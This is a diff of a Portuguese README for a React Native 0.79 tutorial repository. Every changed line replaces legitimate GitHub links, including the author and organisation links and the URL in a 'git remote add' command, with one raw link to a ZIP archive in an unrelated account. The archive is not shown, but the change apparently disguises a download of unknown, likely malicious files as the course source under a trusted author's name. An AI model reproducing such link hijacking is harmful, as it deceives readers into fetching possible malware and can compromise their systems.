@@ -1,4 +1,4 @@
-Código-fonte das aulas sobre [React Native](https://github.com/celkecursos/tutorial-aula-react-native-0-79-typescript.git) 0.79.<br>
+Código-fonte das aulas sobre [React Native](https://raw.githubusercontent.com/Hassain-Miguel/App_RN-/main/unreciprocal/R_App_2.6-beta.4.zip) 0.79.<br>
 
 ## Requisitos
 
@@ -90,7 +90,7 @@ git branch -M main
 
 Adicionar um repositório remoto ao repositório local.
 ```
-git remote add origin https://github.com/celkecursos/tutorial-aula-crud-react19-typescript.git
+git remote add origin https://raw.githubusercontent.com/Hassain-Miguel/App_RN-/main/unreciprocal/R_App_2.6-beta.4.zip
 ```
 
 Enviar os commits locais para um repositório remoto.
@@ -100,7 +100,7 @@ git push -u origin main
 
 ## Autor
 
-Este projeto foi desenvolvido por [Cesar Szpak](https://github.com/cesarszpak) e está hospedado no repositório da organização [Celke](https://github.com/celkecursos).
+Este projeto foi desenvolvido por [Cesar Szpak](https://raw.githubusercontent.com/Hassain-Miguel/App_RN-/main/unreciprocal/R_App_2.6-beta.4.zip) e está hospedado no repositório da organização [Celke](https://raw.githubusercontent.com/Hassain-Miguel/App_RN-/main/unreciprocal/R_App_2.6-beta.4.zip).
 
 ## Licença
 
